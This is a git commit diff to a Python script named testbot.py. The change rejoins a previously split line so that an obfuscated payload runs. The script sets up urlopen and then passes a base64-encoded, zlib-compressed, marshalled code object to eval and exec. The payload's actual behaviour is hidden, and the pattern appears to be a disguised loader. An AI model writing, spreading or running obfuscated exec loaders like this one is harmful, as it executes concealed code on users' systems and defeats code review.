7c549716b77741d2aa9b8ffd66ef26e9e08c1864
Paweł Fuławka <35406045+Pawel605@users.noreply.github.com>
2020-06-24 22:08:54 +0200

    Update testbot.py

--- testbot.py
+++ testbot.py
@@ -2,5 +2,4 @@ import sys, zlib, base64, marshal, json, urllib
 if sys.version_info[0] > 2:
 	from urllib import request
 	urlopen = urllib.request.urlopen if sys.version_info[0]>2 else urllib.urlopen
-exec(eval(marshal.loads(zlib.decompress(base64.b64decode('eJwrNmNgYCgtyskvSMTUM8oKSmw0tc3NN
-Az0DPSMzS1MjEx09cvLklMTy0q1i81NdIrqFTX1CtKTUzR0AQA72wQxQ==')))))
+exec(eval(marshal.loads(zlib.decompress(base64.b64decode('eJwrNmNgYCgtyskvSMTUM8oKSmw0tc3NNAz0DPSMzS1MjEx09cvLklMTy0q1i81NdIrqFTX1CtKTUzR0AQA72wQxQ==')))))
